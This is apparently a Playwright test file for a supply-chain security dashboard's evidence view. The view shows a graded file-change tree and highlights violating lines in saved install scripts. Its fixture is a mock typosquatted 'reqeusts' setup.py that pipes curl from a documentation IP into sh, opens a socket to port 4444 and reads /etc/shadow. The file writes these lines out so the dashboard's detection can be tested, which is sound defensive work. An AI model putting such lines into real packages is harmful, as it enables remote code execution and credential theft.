import type { Locator, Page } from '@playwright/test';
import { expect, SHOTS, test } from './fixtures';
import type { MockBackend } from './mock-backend';
import type { Evidence } from '../src/lib/types';

// 11/10 사용자 결정 — 감사 상세 「증거」 탭의 파일 변경 트리를 시연에서 읽히게
//   ① 폴더는 모두 접힌 채 시작, 비정상(F) 파일이 든 폴더 경로만 펼침
//   ② 오른쪽 표시 = 등급: 정상 A(초록) · 비정상 F(위험 글자색 · 연한 위험 바탕). docker diff 종류(A · C · D)는 툴팁 · aria 로만
//      비정상은 트리 맨 위 + 「비정상 N개 · 정상 M개」 한 줄
//   ③ 비정상 = 이 컨테이너 위반 기록의 대상(open 경로 · exec 인자 중 / 로 시작) — diff 에 없으면(읽기만 함) 새 줄로 넣고 F,
//      저장된 설치 스크립트(files) 중 위반 토큰(IP · 포트 · 경로 · 명령 조각)이 든 파일도 F
//   ④ files 에 있는 파일을 누르면(F 파일은 처음부터) 공통 코드 창 · 줄 번호 · 위반 줄 빨강 + 「위반 관련 줄 N개」
//      내용이 없는 파일은 안내 문장, 잘린 파일은 「64KB 까지만 저장됨」, files 가 없는 옛 증거는 트리만
const SHOT = process.env.EV_SHOTS || `${SHOTS}/evidence-tree-1110`;
const SHEET = '[data-sheet="audit"]';
const NOT_SAVED = '이 파일 내용은 저장되지 않았습니다(설치 스크립트만 격리 직전에 저장합니다).';

const SETUP_PY = [
  'from setuptools import setup',
  'import subprocess, socket',
  '',
  '# 시험용 흉내(무해, 문서용 주소만)',
  'subprocess.run("curl -s http://203.0.113.7/p.sh | sh", shell=True)',
  's = socket.socket(); s.connect(("203.0.113.7", 4444))',
  'data = open("/etc/shadow").read()',
  'setup(name="reqeusts", version="0.0.1")',
].join('\n');

function seed(b: MockBackend, o: { files?: boolean } = {}) {
  const ctr = b.installs.find((s) => s.id === 'ins-0012')!.container;
  const row = b.audit.find((a) => a.event.containerName === ctr && a.enforced)!;
  const cid = row.event.containerId;
  const ev: Evidence = {
    id: 'ev-9', containerId: cid, containerName: ctr, image: 'python:3.12-slim', collectedAt: new Date(Date.now() - 600_000).toISOString(), logs: 'Collecting reqeusts\nRunning setup.py', partial: false, durationMs: 300,
    changes: [
      { kind: 'A', path: '/usr/lib/python3.12/site-packages/reqeusts/__init__.py' },
      { kind: 'A', path: '/usr/lib/python3.12/site-packages/reqeusts/api.py' },
      { kind: 'A', path: '/tmp/p.sh' },
      { kind: 'C', path: '/root/.bashrc' },
      { kind: 'D', path: '/var/log/pip.log' },
      { kind: 'A', path: '/pkg/reqeusts/setup.py' },
    ],
    processes: [],
  };
  if (o.files !== false)
    ev.files = [
      { path: '/pkg/reqeusts/setup.py', size: SETUP_PY.length, truncated: false, content: SETUP_PY },
      { path: '/pkg/reqeusts/pyproject.toml', size: 40, truncated: false, content: '[project]\nname = "reqeusts"\nversion = "0.0.1"' },
      { path: '/pkg/reqeusts/build.sh', size: 65536, truncated: true, content: '#!/bin/sh\necho "building"' },
    ];
  b.evidence = [ev];
  return { ctr, row };
}

const card = (page: Page) => page.locator(`${SHEET} [data-evidence="ev-9"]`);
const tree = (page: Page) => card(page).locator('[data-part="evidence-changes"]');
const item = (page: Page, path: string) => tree(page).locator(`[role="treeitem"][data-path="${path}"]`);
const badge = (page: Page, path: string) => item(page, path).locator(':scope > .ft-row .ft-badge');
const expanded = (t: Locator) => t.locator('[role="treeitem"][data-kind="dir"]').evaluateAll((els) => Object.fromEntries(els.map((e) => [e.getAttribute('data-path'), e.getAttribute('aria-expanded')])));
// 토큰 색(var) → 계산된 rgb
const tokenRgb = (page: Page, v: string) =>
  page.evaluate((v) => {
    const p = document.createElement('i');
    p.style.color = `var(${v})`;
    document.body.appendChild(p);
    const c = getComputedStyle(p).color;
    p.remove();
    return c;
  }, v);
const settled = (page: Page) => page.locator(SHEET).evaluate((e) => Promise.all(e.getAnimations({ subtree: true }).map((a) => a.finished)).then(() => undefined));

async function dashes(page: Page): Promise<string[]> {
  return page.evaluate(() => {
    const out: string[] = [];
    const w = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT);
    while (w.nextNode()) {
      const n = w.currentNode as Text;
      const el = n.parentElement;
      if (n.data.includes('—') && el?.checkVisibility({ checkVisibilityCSS: true })) out.push(n.data.trim().slice(0, 80));
    }
    for (const el of Array.from(document.querySelectorAll('[title], [placeholder], [aria-label]')))
      for (const a of ['title', 'placeholder', 'aria-label']) if (el.getAttribute(a)?.includes('—')) out.push(`@${a} ${el.getAttribute(a)}`);
    return out;
  });
}

async function open(page: Page, b: MockBackend, o: { files?: boolean } = {}) {
  const { ctr, row } = seed(b, o);
  await page.goto(`/audit?id=${row.id}&tab=evidence`);
  await expect(tree(page)).toBeVisible();
  // 위반 기록은 이 컨테이너 이름으로 묻는다(이름 완전 일치는 화면에서 거름)
  await expect.poll(() => b.requests.some((q) => q.method === 'GET' && q.path.startsWith('/audit?') && q.path.includes(`container=${encodeURIComponent(ctr)}`))).toBe(true);
  return { ctr, row };
}

test.describe('11/10 증거 파일 트리: 등급 A/F · 접힘 · 설치 스크립트 코드 보기', () => {
  test('처음 접힘(비정상 폴더만 펼침) · A/F 표시와 색 · 읽기만 한 위반 대상 새 줄 · 비정상 맨 위 · 개수 한 줄 · 1440 밝은', async ({ page, backend }) => {
    await open(page, backend);
    const t = tree(page);
    // ① 비정상이 든 폴더만 펼침(/etc/shadow · /root/.ssh/id_rsa 는 이 컨테이너가 읽기만 한 위반 대상, setup.py 는 위반 줄), 나머지는 접힘
    expect(await expanded(t)).toEqual({
      '/etc': 'true',
      '/pkg': 'true',
      '/pkg/reqeusts': 'true',
      '/root': 'true',
      '/root/.ssh': 'true',
      '/tmp': 'false',
      '/usr': 'false',
      '/usr/lib': 'false',
      '/usr/lib/python3.12': 'false',
      '/usr/lib/python3.12/site-packages': 'false',
      '/usr/lib/python3.12/site-packages/reqeusts': 'false',
      '/var': 'false',
      '/var/log': 'false',
    });
    // 비정상이 든 폴더가 맨 위(그다음 이름순)
    expect(await t.locator(':scope [role="tree"] > [role="treeitem"]').evaluateAll((els) => els.map((e) => e.getAttribute('data-path')))).toEqual(['/etc', '/pkg', '/root', '/tmp', '/usr', '/var']);
    // /root 안에서도 비정상이 든 .ssh 가 .bashrc 보다 위
    expect(await item(page, '/root').locator(':scope > .ft-kids > [role="group"] > [role="treeitem"]').evaluateAll((els) => els.map((e) => e.getAttribute('data-path')))).toEqual(['/root/.ssh', '/root/.bashrc']);
    await expect(badge(page, '/root/.ssh/id_rsa')).toHaveText('F');
    // 같은 폴더 안에서도 비정상 파일이 먼저(setup.py 가 build.sh · pyproject.toml 보다 위)
    expect(await item(page, '/pkg/reqeusts').locator(':scope > .ft-kids [role="treeitem"]').evaluateAll((els) => els.map((e) => e.getAttribute('data-path')))).toEqual([
      '/pkg/reqeusts/setup.py',
      '/pkg/reqeusts/build.sh',
      '/pkg/reqeusts/pyproject.toml',
    ]);

    // ② 표시 = 등급 글자만(A · F), 종류는 툴팁 · aria
    await expect(badge(page, '/etc/shadow')).toHaveText('F');
    await expect(badge(page, '/etc/shadow')).toHaveAttribute('title', '위반 대상(읽기 · 실행)');
    await expect(badge(page, '/etc/shadow')).not.toHaveAttribute('data-change-kind', /.*/); // diff 에 없던 새 줄
    await expect(badge(page, '/pkg/reqeusts/setup.py')).toHaveText('F');
    await expect(badge(page, '/pkg/reqeusts/setup.py')).toHaveAttribute('data-change-kind', 'A');
    await expect(badge(page, '/pkg/reqeusts/setup.py')).toHaveAttribute('title', /추가된 파일/);
    await expect(badge(page, '/root/.bashrc')).toHaveText('A');
    await expect(badge(page, '/root/.bashrc')).toHaveAttribute('data-change-kind', 'C');
    await expect(badge(page, '/root/.bashrc')).toHaveAttribute('title', /변경된 파일/);
    await expect(badge(page, '/var/log/pip.log')).toHaveAttribute('title', /삭제된 파일/);
    await expect(badge(page, '/pkg/reqeusts/pyproject.toml')).toHaveText('A');
    expect(await t.locator('.ft-badge').evaluateAll((els) => [...new Set(els.map((e) => e.textContent))].sort())).toEqual(['A', 'F']);
    for (const p of ['/etc/shadow', '/root/.bashrc']) expect(await badge(page, p).getAttribute('aria-label')).toMatch(p === '/etc/shadow' ? /비정상/ : /정상/);
    // 색: F = 위험 글자색 · 연한 위험 바탕, A = 초록
    const f = badge(page, '/etc/shadow');
    await expect(f).toHaveCSS('color', await tokenRgb(page, '--danger-text'));
    await expect(f).toHaveCSS('background-color', await tokenRgb(page, '--danger-soft'));
    await expect(badge(page, '/pkg/reqeusts/pyproject.toml')).toHaveCSS('color', await tokenRgb(page, '--ok-text'));
    // 개수 한 줄(파일 10 = diff 6 + 새 줄 /etc/shadow · /root/.ssh/id_rsa + 저장만 된 스크립트 2)
    await expect(card(page).locator('[data-part="evidence-grade-sum"]')).toHaveText('비정상 3개 · 정상 7개');
    await expect(card(page).getByText('A 정상 · F 비정상')).toBeVisible();

    expect(await dashes(page)).toEqual([]);
    await settled(page);
    await card(page).locator('[data-part="evidence-files"]').scrollIntoViewIfNeeded();
    await page.screenshot({ path: `${SHOT}/evidence-tree-1440-light.png` });

    // 키보드 동작 그대로: → 접힌 폴더 펼침 · ← 접힘 · Enter 토글
    //   (↑↓ 는 시트가 캡처 단계에서 먼저 받아 다른 행으로 넘긴다 — 이 변경 전부터 같은 동작이라 여기서는 보지 않는다)
    await item(page, '/tmp').focus();
    await page.keyboard.press('ArrowRight');
    await expect(item(page, '/tmp')).toHaveAttribute('aria-expanded', 'true');
    await page.keyboard.press('ArrowLeft');
    await expect(item(page, '/tmp')).toHaveAttribute('aria-expanded', 'false');
    await page.keyboard.press('Enter');
    await expect(item(page, '/tmp')).toHaveAttribute('aria-expanded', 'true');
    await page.keyboard.press('Enter');
    await expect(item(page, '/tmp')).toHaveAttribute('aria-expanded', 'false');

  });

  test('설치 스크립트 코드 창: F 파일이 처음부터 열림 · 위반 줄 빨강 · 개수 · 내용 없는 파일 · 잘린 파일', async ({ page, backend }) => {
    await open(page, backend);
    const files = card(page).locator('[data-part="evidence-files"]');
    // 처음부터 비정상 스크립트(setup.py)가 선택되고 코드 창에 열림
    await expect(item(page, '/pkg/reqeusts/setup.py')).toHaveAttribute('aria-selected', 'true');
    const cw = files.locator('[data-codewin]');
    await expect(cw).toHaveCount(1);
    await expect(cw.locator('.cw-name')).toHaveText('/pkg/reqeusts/setup.py');
    await expect(cw.locator('[data-line]')).toHaveCount(SETUP_PY.split('\n').length);
    await expect(cw.locator('[data-line] .ln').first()).toHaveText('1');
    // 위반 토큰이 든 줄(5 curl · 203.0.113.7 / 6 203.0.113.7 · 4444 / 7 /etc/shadow)만 빨강
    expect(await cw.locator('[data-line][data-hit="1"]').evaluateAll((els) => els.map((e) => Number(e.getAttribute('data-line'))))).toEqual([5, 6, 7]);
    await expect(cw.locator('[data-line="5"]')).toHaveClass(/hl-threat/);
    await expect(cw.locator('[data-line="8"]')).not.toHaveClass(/hl-threat/);
    await expect(files.locator('[data-part="evidence-hit-count"]')).toHaveText('위반 관련 줄 3개');

    // 내용 없는 파일(diff 에만 있음) → 안내 문장, 코드 창 없음
    await item(page, '/etc/shadow').locator(':scope > .ft-row').click();
    await expect(item(page, '/etc/shadow')).toHaveAttribute('aria-selected', 'true');
    await expect(files.locator('[data-part="evidence-no-content"]')).toHaveText(NOT_SAVED);
    await expect(files.locator('[data-codewin]')).toHaveCount(0);

    // 저장된 정상 스크립트 → 코드 창 · 위반 줄 없음
    await item(page, '/pkg/reqeusts/pyproject.toml').locator(':scope > .ft-row').click();
    await expect(files.locator('[data-codewin] .cw-name')).toHaveText('/pkg/reqeusts/pyproject.toml');
    await expect(files.locator('[data-codewin] [data-hit="1"]')).toHaveCount(0);
    await expect(files.locator('[data-part="evidence-hit-count"]')).toHaveText('위반 관련 줄 없음');
    await expect(files.locator('[data-part="evidence-truncated"]')).toHaveCount(0);

    // 잘린 파일 → 끝에 「64KB 까지만 저장됨」
    await item(page, '/pkg/reqeusts/build.sh').locator(':scope > .ft-row').click();
    await expect(files.locator('[data-codewin] .cw-name')).toHaveText('/pkg/reqeusts/build.sh');
    await expect(files.locator('[data-part="evidence-truncated"]')).toHaveText('64KB 까지만 저장됨');

    // 1440 에서는 코드 창이 트리 오른쪽
    await item(page, '/pkg/reqeusts/setup.py').locator(':scope > .ft-row').click();
    const tb = (await tree(page).boundingBox())!;
    const cb = (await files.locator('[data-codewin]').boundingBox())!;
    expect(cb.x).toBeGreaterThan(tb.x + tb.width - 1);
    expect(await dashes(page)).toEqual([]);
  });

  test('옛 증거(files 없음): 트리만 · 선택 없음 · 코드 창 없음 · 읽기만 한 대상은 그래도 F 새 줄', async ({ page, backend }) => {
    await open(page, backend, { files: false });
    const t = tree(page);
    await expect(card(page).locator('[data-part="evidence-files"] [data-codewin]')).toHaveCount(0);
    await expect(card(page).locator('[data-part="evidence-no-content"]')).toHaveCount(0);
    await expect(t.locator('[role="treeitem"][aria-selected]')).toHaveCount(0);
    await expect(badge(page, '/etc/shadow')).toHaveText('F');
    await expect(badge(page, '/pkg/reqeusts/setup.py')).toHaveText('A'); // 내용이 없으니 diff 만으로는 정상
    await expect(card(page).locator('[data-part="evidence-grade-sum"]')).toHaveText('비정상 2개 · 정상 6개');
    expect((await expanded(t))['/etc']).toBe('true');
    expect((await expanded(t))['/pkg']).toBe('false');
    // 파일을 눌러도 아무 일 없음(지금처럼)
    await item(page, '/etc/shadow').locator(':scope > .ft-row').click();
    await expect(t.locator('[role="treeitem"][aria-selected="true"]')).toHaveCount(0);
  });

  test('실데이터 크기(파일 500 · 폴더 99): 처음 펼쳐진 폴더는 비정상 경로뿐', async ({ page, backend }) => {
    const { row } = seed(backend, { files: false });
    const changes = [] as { kind: string; path: string }[];
    for (let d = 0; d < 98; d++) for (let i = 0; i < 5; i++) changes.push({ kind: 'A', path: `/usr/lib/python3.12/site-packages/m${String(d).padStart(2, '0')}/f${i}.py` });
    for (let i = 0; i < 10; i++) changes.push({ kind: 'A', path: `/opt/x${i}` });
    backend.evidence[0].changes = changes;
    await page.goto(`/audit?id=${row.id}&tab=evidence`);
    const t = tree(page);
    await expect(t).toBeVisible();
    const ex = await expanded(t);
    expect(Object.entries(ex).filter(([, v]) => v === 'true').map(([k]) => k)).toEqual(['/etc', '/root', '/root/.ssh']);
    await expect(card(page).locator('[data-part="evidence-grade-sum"]')).toHaveText('비정상 2개 · 정상 500개');
    // 처음 보이는 줄: 맨 위 폴더 4개(/etc · /root · /opt · /usr) + /etc/shadow + /root/.ssh · id_rsa
    expect(await t.locator('[role="treeitem"]').evaluateAll((els) => els.filter((e) => !e.parentElement?.closest('[aria-expanded="false"]')).map((e) => e.getAttribute('data-path')))).toEqual(['/etc', '/etc/shadow', '/root', '/root/.ssh', '/root/.ssh/id_rsa', '/opt', '/usr']);
  });

  test('1440 어두운: F 위험 글자색(어두운 값) · 코드 창 위반 줄', async ({ page, backend }) => {
    await page.addInitScript(() => localStorage.setItem('supplyguard.theme', 'dark'));
    await open(page, backend);
    await expect(page.locator('html')).toHaveAttribute('data-theme', 'dark');
    await expect(badge(page, '/etc/shadow')).toHaveCSS('color', await tokenRgb(page, '--danger-text'));
    await expect(badge(page, '/etc/shadow')).toHaveCSS('background-color', await tokenRgb(page, '--danger-soft'));
    await expect(card(page).locator('[data-part="evidence-files"] [data-hit="1"]')).toHaveCount(3);
    expect(await dashes(page)).toEqual([]);
    await settled(page);
    await page.waitForTimeout(500); // 테마 전환(450ms)이 끝난 뒤
    await card(page).locator('[data-part="evidence-files"]').scrollIntoViewIfNeeded();
    await page.screenshot({ path: `${SHOT}/evidence-tree-1440-dark.png` });
  });

  test('390: 코드 창이 트리 아래 · 가로 넘침 없음', async ({ page, backend }) => {
    await page.setViewportSize({ width: 390, height: 844 });
    await open(page, backend);
    const files = card(page).locator('[data-part="evidence-files"]');
    const cw = files.locator('[data-codewin]');
    await expect(cw).toBeVisible();
    const tb = (await tree(page).boundingBox())!;
    const cb = (await cw.boundingBox())!;
    expect(cb.y).toBeGreaterThanOrEqual(tb.y + tb.height - 1);
    const sheetBox = (await page.locator(SHEET).boundingBox())!;
    expect(cb.x + cb.width).toBeLessThanOrEqual(sheetBox.x + sheetBox.width + 1);
    expect(await page.evaluate(() => document.documentElement.scrollWidth - window.innerWidth)).toBe(0);
    await expect(files.locator('[data-part="evidence-hit-count"]')).toHaveText('위반 관련 줄 3개');
    expect(await dashes(page)).toEqual([]);
    await settled(page);
    await files.scrollIntoViewIfNeeded();
    await page.screenshot({ path: `${SHOT}/evidence-tree-390.png` });
  });
});
